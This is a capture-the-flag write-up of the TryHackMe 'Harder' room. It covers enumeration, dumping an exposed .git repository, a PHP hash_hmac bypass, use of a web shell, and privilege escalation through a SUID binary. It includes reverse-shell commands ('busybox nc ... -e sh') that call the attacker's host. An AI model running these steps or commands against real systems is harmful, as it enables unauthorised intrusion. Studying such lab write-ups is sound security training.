![[Capture d'écran 2025-02-16 210013.png]]   Real pentest findings combined (By [arcc](https://tryhackme.com/p/arcc))
### Recon 


First we need to scan the target machine (10.10.43.115) in order to find any open ports : 
```nmap 10.10.43.115 -p- -sV -sC -oN nmapres```


![[Pasted image 20250215155509.png]]

The scan reveals three open ports:

	- 2/tcp
	- 22/tcp
	- 80/tcp


I initially tried to find subdirectories using `gobuster`, but it didn’t return any results. So, I switched to `dirsearch`: 

```
dirsearch  -u http://harder.thm
```

![[Capture d'écran 2025-02-15 163232.png]]

Unfortunately, this scan didn’t reveal much either, except for the **PHP version: 7.3.19**.

Next, I checked the HTTP headers and discovered something interesting: `pwd.harder.local`.

![[Pasted image 20250215170112.png]]
This led me to a **login page**:

![[Pasted image 20250215171102.png]]


Now, I ran another enumeration scan on this new domain using: 
```
gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt  > gobusteres
```


![[Pasted image 20250215171815.png]]

This revealed a **`.git` repository (301)** and a **`.gitignore` file (200)**.

Checking the `.gitignore` file, I found two files of interest:
- `credentials.php`
- `secret.php`

![[Pasted image 20250215172322.png]]

I continued my enumeration using: `dirsearch  -u http://pwd.harder.local/`


![[Pasted image 20250215173822.png]]


To retrieve the repository locally, I used: `./gitdumper.sh http://pwd.harder.local/.git/  ./repo_harder`  to get the repository on my local machine : 

![[Pasted image 20250215174708.png]]

Among the retrieved files, I found `hmac.php`:


![[Capture d'écran 2025-02-15 193923.png]]

The script expects three parameters: : `h`, `host` and `n` . Looking into **PHP hash_hmac vulnerabilities**, : https://exploit-notes.hdks.org/exploit/web/php-hash-hmac-bypass/

We can bypass the PHP hash_hmac if we succed to set to `False` the third parameters ($secret) : `hash_hmac('sha256',hostname,false)` . And to exploit this, we need to set `n` as an **array**.

However, we must also bypass the following check:
	
	`if ($hm !== $_GET['h'])` ? 

To do this, I computed the expected **HMAC value** offline using a custom script:

**script.php :** 

````
<?php
$hm = hash_hmac('sha256', $_GET['host'], false);
print "hmac value : $hm"
?>
````

**payload :** `curl "http://localhost:8000/script.php?host=tryhackme.com"` 

Then we can get the hmac value for the `h` parameter : 

![[Capture d'écran 2025-02-15 201658.png]]

Now we have our three values for our three parameters : 

	- h  = 7e93acab486751d24a9129bb81cd387b0e2ba805635cfb219c4f10d6e3fd7198
	- host = tryhackme.com
	- n : Array


I then used **Burp Suite** to send the payload, which returned a **URL, username, and plaintext password**:

![[Capture d'écran 2025-02-16 201853.png]]

I added the new domain `shell.harder.local` to my **hosts file** and found another **login page**. I used the obtained credentials:

```
e<...>:9<...>
```

...and they worked!

![[Capture d'écran 2025-02-15 203030.png]]

However, I encountered an error message. To bypass it, I added an **`X-Forwarded-For` header** in my HTTP request:

![[Capture d'écran 2025-02-16 204928.png]]

![[Capture d'écran 2025-02-16 210933.png]]

Now, I could see a **web shell** using the `cmd` parameter:

![[Capture d'écran 2025-02-15 205941.png]]

I used the following command to establish a **reverse shell**: `cmd=busybox nc 10.23.31.32 4321 -e sh`

### Foothold

![[Capture d'écran 2025-02-15 215643.png]]

Now that I have a reverse shell, you can stabilize it using:

```
python3 -c "import pty; pty.spawn('/bin/ash')"
```

I then looked for more information and found the **user flag**:

![[Capture d'écran 2025-02-16 205348.png]]

Exploring further, I checked `/etc` and found **EVS’s password** inside the `periodic/evs-backup.sh` file :
![[Capture d'écran 2025-02-16 205554.png]]

I used it to switch to **evs’s account**:

![[Capture d'écran 2025-02-15 221856.png]]

Next, I searched for **SUID binaries** using:
```
find / -type f -perm -4000 2>/dev/null
```

![[Capture d'écran 2025-02-15 222637.png]]
### Privilege Escalation & Exploitation

Since I found a **SUID binary**, I suspected I could escalate privileges.
I created a file containing a **reverse shell command**:

```
echo -n "busybox nc  10.23.31.32 4242 -e sh" > command
gpg --symmetric --cipher-algo AES256 command
```

Then I've just typed a random passphrase `test`: 

![[Capture d'écran 2025-02-15 223802.png]]

Then retyped it :

![[Capture d'écran 2025-02-15 223824.png]]

After entering a passphrase (`test`), I executed:

```
/usr/local/bin/executed-crypted command.jpg
```

That asked me to retype the passphrase (`test`) : 

![[Capture d'écran 2025-02-15 223802.png]]

And I successfully obtained a root shell on my listener, allowing me to retrieve the **root flag** :

![[Capture d'écran 2025-02-16 205816.png]]

**Congratulations!** I hope you enjoyed this writeup. This CTF was a great exercise in **enumeration**, from identifying open ports and analyzing HTTP headers to exploiting misconfigurations and escalating privileges. It reinforced the importance of thorough reconnaissance and attention to detail.

Thanks for reading, and happy hacking!

![[Capture d'écran 2025-02-15 225142.png]]


